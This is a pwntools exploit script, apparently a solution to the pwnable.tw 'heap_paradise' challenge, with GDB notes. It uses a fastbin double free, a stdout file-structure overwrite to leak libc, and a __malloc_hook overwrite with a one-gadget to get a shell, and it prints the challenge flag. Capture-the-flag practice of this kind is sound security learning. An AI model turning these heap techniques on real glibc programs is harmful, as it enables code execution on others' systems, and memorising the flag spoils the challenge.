
### GDB tips 
## p (_IO_FILE) stdin
## p *(struct _IO_FILE_plus *)0x804a24c
## p *((struct _IO_FILE_plus *)0x804a24c).vtable
## == p *((struct _IO_jump_t *)0x7ffff7dd06e0)

## p _IO_2_1_stdout_

from pwn import *


l = ELF("./libc_64.so.6")
malloc_hook = l.symbols[b'__malloc_hook']
#print("__malloc_hook: ", hex(malloc_hook))
free_hook = l.symbols[b'__free_hook']
#print("__free_hook: ", hex(free_hook))
IO_stdout = l.symbols[b'_IO_2_1_stdout_']
#print("_IO_2_1_stdout_: ", hex(IO_stdout))
IO_stdin = l.symbols[b'_IO_2_1_stdin_']

while True:
    r = remote("chall.pwnable.tw", 10308)
    #r = process('./heap_paradise', env={"LD_PRELOAD":"./libc-2.23.so"})


    def new(size, data):
        r.recvuntil(":")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.send(data) ### sendline will append null byte at the end of data


    def delete(idx):
        r.recvuntil(":")
        r.sendline("2")    
        r.recvuntil(":")
        r.sendline(str(idx))



    try:
        ### forge overlap chunk to create unsorted bin
        #   free chunk size > 0x78 will record [main_arena+88] in fd and bk 

        new(0x68, b"a"*0x10 + p64(0x0) + p64(0x71)) # chunk[0] (+0x00)
        new(0x68, b'b'*0x40 + p64(0x0) + p64(0x21)) # chunk[1] (+0x70)
        delete(0)
        delete(1)
        delete(0)


        
        new(0x68, b'\x20') ## write_addr ## 1/16 probability # chunk[2] (+0x00)
        new(0x68, b'\x00') # chunk[3] (+0x70)
        new(0x68, b'\x00') # chunk[4] (+0x00)
        new(0x68, b'\x00') ## write_data # chunk[5] (+0x20)


        delete(0)
        new(0x68, b"x"*0x10 + p64(0) + p64(0xa1)) # chunk[6] (+0x00)
        delete(5) ## free fake chunk 0x78 to get unsorted bin

        '''
        main_arena + 0x0b78 ## get by unsorted bin
        main_arena + 0x1620 ## real target
        main_arena + 0x15dd ## addr to allocate fake chunk
        '''
        ### write IO_stdout
                
        delete(0)

        delete(1)
        new(0x78, b'f'*0x40 + p64(0) + p64(0x71) + b"\xa0") # chunk[7] (+0x20) ## let (0x70) -> (0xa0) 
        
        delete(7)
        #print("_IO_2_1_stdout_: ", p64(IO_stdout - 0x43)[:2]) #b'\xdd\x85'
        new(0x68, b"c"*0x20 + p64(0) + p64(0x71) + p64(IO_stdout - 0x43)[:2]) # chunk[8] (+0x70) ## let (0xa0) -> IO_stdout
        new(0x68, b"\x00" ) # chunk[9] (+0xa0) ## let -> IO_stdout (shift to forge chunk size 0x7f)
        #input("@")
        ### # _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING
        new(0x68, b'\x00'*3 + p64(0)*6 + p64(0xfbad1800) + p64(0)*3 + b"\x80" ) # chunk[10] (IO_stdout)
        if(u64(r.recvn(8)) != 0):
            raise Exception('no leak')

        libc_base = u64(r.recvn(8)) - IO_stdin # 0x3998e0 
        print("libc_addr: ", hex(libc_base))
        #input("@")
        #print("_IO_2_1_stdin_: ", hex(IO_stdin))
        print("__malloc_hook: ", hex(malloc_hook)) # 0x3c3b10
        #print("__free_hook: ", hex(free_hook)) # 0x39b7a8
        main_arena_addr = libc_base + malloc_hook + 0x10
        #print("main_arena_addr: ", hex(main_arena_addr))
        #input("@")
        delete(1)
        #input("@")
        new(0x78, b'c'*0x40 + p64(0) + p64(0x71) + p64(main_arena_addr - 0x33)) # chunk[11]
        #input("@")
        new(0x68, b"\x00") # chunk[12]
        input("@")
        new(0x68, b'z'*0x13 + p64(libc_base + 0xef6c4)) # chunk[13]

        r.sendlineafter(":", "1")
        r.sendlineafter(":", "8")

        r.interactive()
        break
        
    except:
        print("fail gg")
        r.close()


#FLAG{W3lc0m3_2_h3ap_p4radis3}